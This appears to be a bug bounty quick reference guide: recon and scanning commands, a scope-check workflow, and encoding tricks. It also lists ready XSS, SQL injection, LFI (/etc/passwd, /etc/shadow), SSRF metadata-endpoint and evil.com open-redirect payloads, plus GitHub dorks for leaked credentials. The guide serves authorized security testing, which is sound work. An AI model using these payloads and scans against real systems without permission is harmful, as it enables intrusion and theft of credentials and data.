# Bug Bounty Quick Reference Guide

## 🚀 Quick Start

```bash
# 0. Create/update the program scope (once per program)
./bugbounty-hunter.sh new program-name
# -> edit ../programs/program-name.md with the real scope from HackerOne

# 1. Verify that the target is in scope before touching anything
./bugbounty-hunter.sh scope example.com

# 1.5 Verify that your local DNS is not hijacking/blocking the domain
#     (common in gambling/adult/streaming niches — ISPs redirect to a
#     warning page instead of resolving the actual site)
./bugbounty-hunter.sh resolve example.com

# Full pipeline
./bugbounty-hunter.sh full example.com

# Recon only
./bugbounty-hunter.sh recon example.com

# View platforms
./bugbounty-hunter.sh platforms
```

All active phases (`recon`, `vuln`, `brute`, `secrets`, `api`, `full`)
automatically verify the scope against `../programs/*.md` and abort if the
target is not documented or is marked as *Out of Scope*.

---

## 🎯 5-Phase Methodology

### Phase 1: Reconnaissance
```bash
# Subdomain enumeration
subfinder -d target.com -o subdomains.txt
amass enum -passive -d target.com >> subdomains.txt

# HTTP probing
httpx -l subdomains.txt -o live.txt

# Wayback URLs
echo "target.com" | gau > wayback.txt
waybackurls target.com >> wayback.txt

# JS endpoints
katana -u "https://target.com" -d 3 -jc -o js_endpoints.txt
```

### Phase 2: Scanning
```bash
# Nuclei - Vulnerability scanner
echo "https://target.com" | nuclei -severity critical,high

# CORS testing
nuclei -u "https://target.com" -t nuclei-templates/http/misconfiguration/cors*

# XSS detection
dalfox url "https://target.com/?param=test"

# SQL injection
sqlmap -u "https://target.com/?id=1" --batch --level=1
```

### Phase 3: Fuzzing
```bash
# Directory fuzzing
feroxbuster -u "https://target.com" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt

# Parameter fuzzing
ffuf -u "https://target.com/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

# VHost fuzzing
ffuf -u "https://target.com" -H "Host: FUZZ.target.com" -w subdomains.txt
```

### Phase 4: Exploitation
```bash
# SSRF testing
curl "https://target.com/api?url=http://169.254.169.254/latest/meta-data/"

# IDOR testing
# Change IDs in URLs: /user/123 → /user/124

# Open redirect
# Test parameters: ?next=, ?redirect=, ?url=, ?return=
```

### Phase 5: Reporting
```bash
# Generate report
./bugbounty-hunter.sh report example.com
```

---

## 🏆 Vulnerability Types (by bounty)

### Critical ($5,000+)
- Remote Code Execution (RCE)
- SQL Injection with data access
- Authentication bypass
- Server-side Request Forgery (SSRF) → Internal access
- Deserialization vulnerabilities

### High ($1,000-$5,000)
- Stored XSS
- IDOR with access to sensitive data
- CSRF on critical actions
- Open redirect → Account takeover
- SSRF (without internal access)

### Medium ($500-$1,000)
- Reflected XSS
- CSRF on non-critical actions
- Information disclosure
- Missing rate limiting
- Session fixation

### Low ($100-$500)
- Version disclosure
- Missing security headers
- Verbose error messages
- Clickjacking
- Open redirect (without impact)

---

## 🛠️ Essential Tools

### Reconnaissance
| Tool | Use |
|-------------|-----|
| subfinder | Subdomain enumeration |
| amass | OSINT enumeration |
| httpx | HTTP probing |
| waybackurls | Wayback Machine URLs |
| gau | URL fetcher |
| katana | Web crawler |

### Vulnerability Scanning
| Tool | Use |
|-------------|-----|
| nuclei | Template-based scanning |
| dalfox | XSS scanner |
| sqlmap | SQL injection |
| ffuf | Web fuzzer |
| feroxbuster | Directory brute |

### Exploitation
| Tool | Use |
|-------------|-----|
| curl | HTTP requests |
| wget | File download |
| python | Scripting |
| Burp Suite | HTTP proxy |

---

## 📋 Security Checklist

### HTTP Headers
- [ ] Strict-Transport-Security
- [ ] X-Content-Type-Options
- [ ] X-Frame-Options
- [ ] Content-Security-Policy
- [ ] X-XSS-Protection
- [ ] Referrer-Policy
- [ ] Permissions-Policy

### Cookies
- [ ] HttpOnly flag
- [ ] Secure flag
- [ ] SameSite attribute
- [ ] Path restriction
- [ ] Expiration

### Authentication
- [ ] Rate limiting
- [ ] Account lockout
- [ ] Password policy
- [ ] MFA support
- [ ] Session management

---

## 🎯 Dorking Queries

### Google Dorks
```
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com inurl:login
site:target.com intitle:"index of"
site:target.com ext:sql | ext:bak
site:target.com inurl:api
```

### GitHub Dorks
```
"target.com" password
"target.com" api_key
"target.com" secret
"target.com" credentials
filename:config.php target.com
```

---

## 🔐 Encoding Bypass Techniques

### Base64 Encoding
```bash
# Encode payload
echo -n 'etc/passwd' | base64
# Result: ZXRjL3Bhc3N3ZA==

# Decode
echo 'ZXRjL3Bhc3N3ZA==' | base64 -d
```

### Common Payloads
| Original | Base64 |
|----------|--------|
| `/etc/passwd` | `L2V0Yy9wYXNzd2Q=` |
| `/etc/shadow` | `L2V0Yy9zaGFkb3c=` |
| `../../etc/passwd` | `Li4vLi4vLi4vZXRjL3Bhc3N3ZA==` |

### Use in Attacks
```
# LFI Bypass
url/?f=L2V0Yy9wYXNzd2Q=        # /etc/passwd encoded

# SQL Injection Bypass
' OR 1=1 -- => JyBPUiAxPTEgLS0=

# XSS Bypass
<script>alert(1)</script> => PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### URL Encoding
```bash
# Encode
python3 -c 'import urllib.parse; print(urllib.parse.quote("<script>"))'
# Result: %3Cscript%3E

# Double encoding
python3 -c 'import urllib.parse; print(urllib.parse.quote("%3Cscript%3E"))'
# Result: %253Cscript%253E
```

### Unicode Encoding
```
< = \u003C
> = \u003E
' = \u0027
" = \u0022
```

### HTML Entity Encoding
```
< = &#60; or &#x3C;
> = &#62; or &#x3E;
' = &#39; or &#x27;
" = &#34; or &#x22;
```

### Mixed Encoding Attacks
```
# SQL Injection
' OR 1=1 --
=> %27%20OR%201%3D1%20--
=> %27%20%4F%52%201%3D1%20--

# XSS
<script>alert(1)</script>
=> %3Cscript%3Ealert(1)%3C/script%3E
=> &#60;script&#62;alert(1)&#60;/script&#62;

# LFI
../../etc/passwd
=> ..%2F..%2F..%2Fetc%2Fpasswd
=> ....//....//....//etc/passwd
```

---

## 📝 Payload Templates

### XSS
```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
```

### SQL Injection
```
' OR 1=1 --
' UNION SELECT NULL--
1' AND '1'='1
admin'--
```

### SSRF
```
http://169.254.169.254/latest/meta-data/
http://localhost:8080
http://[::1]
http://0177.0.0.1
```

### Open Redirect
```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?next=https://evil.com
https://target.com/redirect?return=https://evil.com
```

---

## 🏅 Related Certifications

- **OSCP** - OffSec Certified Professional
- **CEH** - Certified Ethical Hacker
- **OSWE** - OffSec Web Expert
- **BSCP** - Burp Suite Certified Practitioner
- **eWPT** - Web Application Penetration Tester

---

## 📚 Learning Resources

### Platforms
- [TryHackMe](https://tryhackme.com) - Learning paths
- [HackTheBox](https://hackthebox.com) - Machines
- [PortSwigger](https://portswigger.net/web-security) - Web security
- [PicoCTF](https://picoctf.org) - CTF challenges

### Blogs
- [PortSwigger Research](https://portswigger.net/research)
- [Google Project Zero](https://googleprojectzero.blogspot.com)
- [Orange Tsai](https://blog.orange.tw)
- [Corben Leo](https://corben.io)

---

*[your-handle] — Bug Bounty Framework*
